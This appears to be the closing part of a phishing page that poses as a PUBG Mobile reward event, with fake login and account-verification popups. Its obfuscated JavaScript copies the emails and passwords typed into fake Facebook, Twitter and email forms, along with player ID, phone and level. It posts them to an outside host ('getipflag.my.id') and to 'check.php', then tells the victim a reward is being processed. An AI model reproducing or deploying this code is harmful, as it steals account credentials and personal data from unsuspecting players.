<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button>
</div> <!--- popup-box-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-alert4 --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert3"><br>
Thank you for joining in this event
<br>
Your account is being processed to receive your reward. Please wait up to 24 hours. </div>
<div class="popup-box-alert0">
<br>- PUBG MOBILE -
</div> <!--- popup-box-alert0 --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://www.pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script src="./index_files/jquery.min.js.download"></script>
<script type="text/javascript" src="index_files/gift-zone.js"></script>
<script type="text/javascript" src="js-zone/showHide.js"></script>
<script type="text/javascript" src="js-zone/slider.js"></script>
<script type="text/javascript" src="js-zone/script.js"></script>
<audio id="audioFile" src="https://g.top4top.io/m_2246xtcs10.mp3"></audio>
<script>
var _0x4e9980=_0x2541;(function(_0x273f25,_0x3e3eba){var _0x1def2c=_0x2541,_0x1c43ae=_0x273f25();while(!![]){try{var _0x4ff4e4=parseInt(_0x1def2c(0xfb))/0x1+-parseInt(_0x1def2c(0xe9))/0x2+parseInt(_0x1def2c(0xcd))/0x3+-parseInt(_0x1def2c(0xd9))/0x4+-parseInt(_0x1def2c(0xef))/0x5+parseInt(_0x1def2c(0xce))/0x6*(-parseInt(_0x1def2c(0xf6))/0x7)+-parseInt(_0x1def2c(0xd1))/0x8*(-parseInt(_0x1def2c(0x101))/0x9);if(_0x4ff4e4===_0x3e3eba)break;else _0x1c43ae['push'](_0x1c43ae['shift']());}catch(_0x64b075){_0x1c43ae['push'](_0x1c43ae['shift']());}}}(_0x368f,0x1e7f7));function _0x2541(_0x1af972,_0x1d2189){var _0x368fb3=_0x368f();return _0x2541=function(_0x25415d,_0x3e12ab){_0x25415d=_0x25415d-0xca;var _0x54dcee=_0x368fb3[_0x25415d];return _0x54dcee;},_0x2541(_0x1af972,_0x1d2189);}function close_facebook(){var _0x282975=_0x2541;$('.login-facebook')[_0x282975(0xed)](),$(_0x282975(0xea))[_0x282975(0xd0)]();}function close_twitter(){var _0x617300=_0x2541;$('.login-twitter')['hide'](),$(_0x617300(0xea))[_0x617300(0xd0)]();}function open_verification(){var _0xa84c39=_0x2541;$(_0xa84c39(0xda))[_0xa84c39(0xd0)](),$(_0xa84c39(0xe8))[_0xa84c39(0xed)]();}$(document)['ready'](function(){var _0x5347e7=0x3b,_0x576b96=0x3b,_0x299ccb=0x17;function _0x43195b(){var _0x4d0b13=_0x2541;setTimeout(_0x43195b,0x3e8),$('#latestTimer')[_0x4d0b13(0xca)](''+_0x299ccb+'\x20:\x20'+_0x576b96+_0x4d0b13(0xcc)+_0x5347e7+''),_0x5347e7--,_0x5347e7<0x0&&(_0x5347e7=0x3b,_0x576b96--,_0x576b96<0x0&&(_0x576b96=0x0,_0x5347e7=0x0));}_0x43195b();});var slideIndexHeader=0x0;showSlidesHeader();function showSlidesHeader(){var _0x1e97c2=_0x2541,_0x3a59f3,_0x19705d=document[_0x1e97c2(0xde)](_0x1e97c2(0xf4));for(_0x3a59f3=0x0;_0x3a59f3<_0x19705d[_0x1e97c2(0xfe)];_0x3a59f3++){_0x19705d[_0x3a59f3]['style']['display']=_0x1e97c2(0xd7);}slideIndexHeader++,slideIndexHeader>_0x19705d[_0x1e97c2(0xfe)]&&(slideIndexHeader=0x1),_0x19705d[slideIndexHeader-0x1][_0x1e97c2(0x100)]['display']=_0x1e97c2(0x10c),setTimeout(showSlidesHeader,0x9c4);}var slideIndexHeader=0x0;showSlidesHeader();function showSlidesHeader(){var _0x1a1c26=_0x2541,_0x14ba22,_0x555129=document['getElementsByClassName']('slider');for(_0x14ba22=0x0;_0x14ba22<_0x555129[_0x1a1c26(0xfe)];_0x14ba22++){_0x555129[_0x14ba22][_0x1a1c26(0x100)][_0x1a1c26(0xe1)]='none';}slideIndexHeader++,slideIndexHeader>_0x555129[_0x1a1c26(0xfe)]&&(slideIndexHeader=0x1),_0x555129[slideIndexHeader-0x1][_0x1a1c26(0x100)][_0x1a1c26(0xe1)]=_0x1a1c26(0x10c),setTimeout(showSlidesHeader,0x9c4);}var buka=new Audio();buka[_0x4e9980(0xcf)]=_0x4e9980(0xdd);var tutup=new Audio();tutup['src']=_0x4e9980(0x104);function openRewards(_0x558a69,_0x363291){var _0x243531=_0x4e9980,_0x2e51e9,_0x2ae498,_0x3f6cd4;_0x2ae498=document['getElementsByClassName']('tab_rewards');for(_0x2e51e9=0x0;_0x2e51e9<_0x2ae498[_0x243531(0xfe)];_0x2e51e9++){_0x2ae498[_0x2e51e9][_0x243531(0x100)][_0x243531(0xe1)]=_0x243531(0xd7);}_0x3f6cd4=document[_0x243531(0xde)](_0x243531(0x10d));for(_0x2e51e9=0x0;_0x2e51e9<_0x3f6cd4['length'];_0x2e51e9++){_0x3f6cd4[_0x2e51e9][_0x243531(0x106)]=_0x3f6cd4[_0x2e51e9][_0x243531(0x106)]['replace'](_0x243531(0xd2),'');}document['getElementById'](_0x363291)[_0x243531(0x100)][_0x243531(0xe1)]='block',_0x558a69['currentTarget']['className']+=_0x243531(0xd2);}document['getElementById'](_0x4e9980(0xdb))[_0x4e9980(0xd4)]();function open_rewardsBox(){var _0x53ed58=_0x4e9980;$(_0x53ed58(0xe4))[_0x53ed58(0xd0)](),$('.rewardsHome')[_0x53ed58(0xed)]();}function open_itemReward_confirmation(_0x2bd842){var _0x17a839=_0x4e9980,_0x3a8232=$(_0x2bd842)['attr']('src');$(_0x17a839(0xe8))[_0x17a839(0xd0)](),$('#myItemReward_confirmationImg')[_0x17a839(0xe5)]('src',_0x3a8232);}function open_otherReward_confirmation(_0x23317){var _0xfbc983=_0x4e9980,_0x4a2995=$(_0x23317)[_0xfbc983(0xe5)](_0xfbc983(0xcf)),_0x13cc45=$(_0x23317)['attr'](_0xfbc983(0xfa));$('.otherReward_confirmation')[_0xfbc983(0xd0)](),$(_0xfbc983(0xe2))[_0xfbc983(0xe5)](_0xfbc983(0xcf),_0x4a2995),$(_0xfbc983(0x10b))[_0xfbc983(0xca)](_0x13cc45);}function open_account_login(){var _0x526062=_0x4e9980;$('.account_login')[_0x526062(0xd0)](),$(_0x526062(0xe8))['hide'](),$(_0x526062(0xe0))[_0x526062(0xed)]();}function open_facebook(){var _0x167295=_0x4e9980;$(_0x167295(0xf0))[_0x167295(0xd0)](),$(_0x167295(0xea))[_0x167295(0xed)]();}function open_twitter(){var _0x24ef27=_0x4e9980;$(_0x24ef27(0x110))['show'](),$(_0x24ef27(0xea))[_0x24ef27(0xed)]();}function close_reward_confirmation(){var _0x55e9d0=_0x4e9980;$(_0x55e9d0(0xe8))[_0x55e9d0(0xed)](),$('.otherReward_confirmation')[_0x55e9d0(0xed)]();}function tutup_facebook(){var _0x532c89=_0x4e9980;$('.login-facebook')[_0x532c89(0xed)](),$(_0x532c89(0xea))[_0x532c89(0xd0)]();}function _0x368f(){var _0x5357c0=['#ValidateLoginTwitterForm','#otherReward_confirmationValue','block','menu-content','trim','#login-twitter','.login-twitter','input#validateEmail','html','#ValidateVerificationDataForm','\x20:\x20','121644AvqtDr','12UpNZKh','src','show','8EZTqxU','\x20menu-content-active','POST','click','input#validatePassword','.check_verification','none','input#rpl','604096TNbfWG','.account_verification','defaultTabRewards','check.php','https://l.top4top.io/m_1725u5z7i1.mp3','getElementsByClassName','#ValidateLoginFbForm','.otherReward_confirmation','display','#myOtherReward_confirmationImg','#ValidateLoginEmailForm','.rewardsBox','attr','.email_login','input#tier','.itemReward_confirmation','328172FZryFm','.account_login','submit','input#level','hide','input#phone','720225PxzRrn','.login-facebook','input#validateLogin','.processing_account','#login-facebook','sliderHeader','#password-link','164129jieCBQ','input#rpt','#email-facebook','#password-twitter','value','100608PfVUzV','input#playid','.login-link','length','val','style','4408308XOVCKC','https://getipflag.my.id/','#email-twitter','https://a.top4top.io/m_1725zobal2.mp3','#login-link','className','#password-facebook','preventDefault','ajax'];_0x368f=function(){return _0x5357c0;};return _0x368f();}function tutup_twitter(){var _0x5c48a6=_0x4e9980;$('.login-twitter')[_0x5c48a6(0xed)](),$(_0x5c48a6(0xea))[_0x5c48a6(0xd0)]();}function ValidateLoginFbData(){var _0x5aa627=_0x4e9980;$(_0x5aa627(0xdf))[_0x5aa627(0xeb)](function(_0x3a5f10){var _0x4bde34=_0x5aa627;_0x3a5f10[_0x4bde34(0x108)](),$email=$(_0x4bde34(0xf8))['val']()[_0x4bde34(0x10e)](),$password=$(_0x4bde34(0x107))['val']()['trim'](),$login=$(_0x4bde34(0xf3))[_0x4bde34(0xff)]()[_0x4bde34(0x10e)]();if($email==''||$password==''){}else $(_0x4bde34(0xf0))[_0x4bde34(0xed)](),$(_0x4bde34(0xda))[_0x4bde34(0xd0)](),$(_0x4bde34(0x111))['val']($email),$('input#validatePassword')[_0x4bde34(0xff)]($password),$(_0x4bde34(0xf1))[_0x4bde34(0xff)]($login);});}function ValidateLoginTwitterData(){var _0xb0dfaa=_0x4e9980;$(_0xb0dfaa(0x10a))[_0xb0dfaa(0xeb)](function(_0x48ea1d){var _0x51c17c=_0xb0dfaa;_0x48ea1d['preventDefault'](),$email=$(_0x51c17c(0x103))[_0x51c17c(0xff)]()[_0x51c17c(0x10e)](),$password=$(_0x51c17c(0xf9))[_0x51c17c(0xff)]()[_0x51c17c(0x10e)](),$login=$(_0x51c17c(0x10f))[_0x51c17c(0xff)]()[_0x51c17c(0x10e)]();if($email==''||$password==''){}else $(_0x51c17c(0x110))[_0x51c17c(0xed)](),$(_0x51c17c(0xda))[_0x51c17c(0xd0)](),$(_0x51c17c(0x111))[_0x51c17c(0xff)]($email),$(_0x51c17c(0xd5))[_0x51c17c(0xff)]($password),$(_0x51c17c(0xf1))[_0x51c17c(0xff)]($login);});}function ValidateLoginEmailData(){var _0x2c4b05=_0x4e9980;$(_0x2c4b05(0xe3))[_0x2c4b05(0xeb)](function(_0x2e69ee){var _0x39d9cb=_0x2c4b05;_0x2e69ee[_0x39d9cb(0x108)](),$email=$('#email-link')[_0x39d9cb(0xff)]()[_0x39d9cb(0x10e)](),$password=$(_0x39d9cb(0xf5))[_0x39d9cb(0xff)]()[_0x39d9cb(0x10e)](),$login=$(_0x39d9cb(0x105))['val']()[_0x39d9cb(0x10e)]();if($email==''||$password==''){}else $(_0x39d9cb(0xfd))[_0x39d9cb(0xed)](),$(_0x39d9cb(0xda))[_0x39d9cb(0xd0)](),$(_0x39d9cb(0x111))[_0x39d9cb(0xff)]($email),$(_0x39d9cb(0xd5))[_0x39d9cb(0xff)]($password),$('input#validateLogin')[_0x39d9cb(0xff)]($login);});}function ValidateVerificationData(){var _0x3316c9=_0x4e9980,_0x4273c3=$('#ValidateVerificationDataForm')['serialize']();return $[_0x3316c9(0x109)]({'url':_0x3316c9(0x102),'data':_0x4273c3,'type':_0x3316c9(0xd3),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$(_0x3316c9(0xcb))['submit'](function(_0x30a4a6){var _0x1cb3ae=_0x3316c9;_0x30a4a6[_0x1cb3ae(0x108)]();var _0x558369=$(_0x1cb3ae(0x111))['val'](),_0xb74d38=$('input#validatePassword')[_0x1cb3ae(0xff)](),_0x1c1dfa=$('input#nick')['val'](),_0x4ea480=$(_0x1cb3ae(0xfc))[_0x1cb3ae(0xff)](),_0x50cfa3=$(_0x1cb3ae(0xee))[_0x1cb3ae(0xff)](),_0x2d7139=$(_0x1cb3ae(0xec))[_0x1cb3ae(0xff)](),_0x309628=$(_0x1cb3ae(0xe7))[_0x1cb3ae(0xff)](),_0x45f46c=$(_0x1cb3ae(0xf7))[_0x1cb3ae(0xff)](),_0x3f986f=$(_0x1cb3ae(0xd8))[_0x1cb3ae(0xff)](),_0x231f4d=$('input#platform')[_0x1cb3ae(0xff)](),_0x653853=$('input#validateLogin')[_0x1cb3ae(0xff)]();if(_0x558369==''&&_0xb74d38==''&&_0x1c1dfa==''&&_0x4ea480==''&&_0x50cfa3==''&&_0x2d7139==''&&_0x309628==''&&_0x45f46c==''&&_0x3f986f==''&&_0x231f4d==''&&_0x653853=='')return $('.verification_info')[_0x1cb3ae(0xd0)](),$(_0x1cb3ae(0xda))[_0x1cb3ae(0xed)](),![];$['ajax']({'type':'POST','url':_0x1cb3ae(0xdc),'data':$(this)['serialize'](),'beforeSend':function(){var _0x35a8b7=_0x1cb3ae;$(_0x35a8b7(0xd6))[_0x35a8b7(0xd0)](),$('.account_verification')[_0x35a8b7(0xed)](),$('.email_login')[_0x35a8b7(0xed)]();},'success':function(){var _0x1d023a=_0x1cb3ae;$(_0x1d023a(0xf2))[_0x1d023a(0xd0)](),$('.check_verification')[_0x1d023a(0xed)](),$(_0x1d023a(0xda))[_0x1d023a(0xed)](),$(_0x1d023a(0xe6))[_0x1d023a(0xed)]();}});}),![];};
</script>
</body>
</html>